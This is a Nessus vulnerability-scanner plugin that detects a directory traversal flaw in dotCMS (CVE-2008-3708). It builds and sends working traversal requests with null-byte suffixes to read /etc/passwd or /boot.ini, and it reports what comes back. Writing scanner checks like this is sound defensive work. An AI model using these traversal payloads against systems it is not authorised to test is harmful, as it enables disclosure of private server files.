#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33925);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2008-3708");
  script_bugtraq_id(30703);
  script_osvdb_id(47548, 47549);
  script_xref(name:"EDB-ID", value:"6247");
  script_xref(name:"Secunia", value:"31516");

  script_name(english:"dotCMS Multiple Script id Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java application that is affected by
multiple directory traversal vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is using dotCMS, an open source J2EE / Java web
content management system. 

The version of dotCMS installed on the remote host fails to sanitize
input to the 'id' parameter of the 'news/index.dot' and
'getting_started/macros/macros_detail.dot' scripts before using it to
access files.  An unauthenticated attacker may be able to leverage
this issue to retrieve the contents of arbitrary files on the remote
host, subject to the privileges of the web server user id." );
 # http://web.archive.org/web/20110831142204/http://jira.dotmarketing.net/browse/DOTCMS-1837
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1478b8e6" );
 script_set_attribute(attribute:"see_also", value:"http://tech.groups.yahoo.com/group/dotcms/message/2467" );
 script_set_attribute(attribute:"solution", value:
"Update to the fixed version of 'DotResourceLoader.java' as discussed
in the references above." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/08/18");
 script_cvs_date("$Date: 2017/05/16 19:35:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:dotcms:dotcms");

script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);

os = get_kb_item("Host/OS");
if (!os) files = make_list("/boot.ini", "/etc/passwd");
else
{
  if ("Windows" >< os) files = make_list("/boot.ini");
  else files = make_list("/etc/passwd");
}


if (thorough_tests) 
{
  exploits = make_list(
    string("/news/index.dot?id="),
    string("/getting_started/macros/macros_detail.dot?id=")
  );
}
else
{
  exploits = make_list(
    string("/news/index.dot?id=")
  );
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/dotcms", "/home", cgi_dirs()));
else dirs = make_list(cgi_dirs());

info = "";
foreach dir (dirs)
{
  foreach file (files)
  {
    foreach exploit (exploits)
    {
      # Try to retrieve a local file.
      url = string(dir, exploit, "../../../../../../../../../../../../", file, "%00");
      if ("/news/index.dot" >< exploit) url = string(url, ".jpg");
      else url = string(url, ".html");

      r = http_send_recv3(method: "GET", item:url, port:port);
      if (isnull(r)) exit(0);

      # There's a problem if...
      if (
        ("boot.ini" >< file && "[boot loader]" >< r[2]) ||
        ("/etc/passwd" >< file && egrep(pattern:"root:.*:0:[01]:", string:r[2]))
      )
      {
        info = info +
               '  ' + url + '\n';

        if (!contents && report_verbosity > 1)
        {
          if ("news/index.dot" >< exploit && '<div class="shadebox">' >< r[2])
          {
            contents = strstr(r[2], '<div class="shadebox">') - '<div class="shadebox">';
            contents = contents - strstr(contents, "<h2>");
            contents = strstr(contents, '\n   ') - '\n   ';
          }
          else if ("macros_detail.dot" >< exploit && '<div class="yui-u first">' >< r[2])
          {
            contents = strstr(r[2], '<div class="yui-u first">') - '<div class="yui-u first">';
            contents = contents - strstr(contents, "<h2>");
            contents = strstr(contents, '\n   ') - '\n   ';
          }

          if (
            ("boot.ini" >< file && "[boot loader]" >!< r[2]) ||
            ("/etc/passwd" >< file && !egrep(pattern:"root:.*:0:[01]:", string:r[2]))
          ) contents = r[2];
        }
        if (!thorough_tests) break;
      }
    }
  }
  if (info && !thorough_tests) break;
}


# Report any findings.
if (info)
{
  if (report_verbosity)
  {
    if (max_index(split(info)) > 1) s = "s";
    else s = "";

    report = string(
      "\n",
      "Nessus was able to retrieve the contents of a file on the remote host\n",
      "by sending the following request", s, " :\n",
      "\n",
      info
    );
    if (report_verbosity > 1 && contents)
      report = string(
        report,
        "\n",
        "And here are the contents :\n",
        "\n",
        "  ", str_replace(find:'\n', replace:'\n  ', string:contents), "\n"
      );

    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
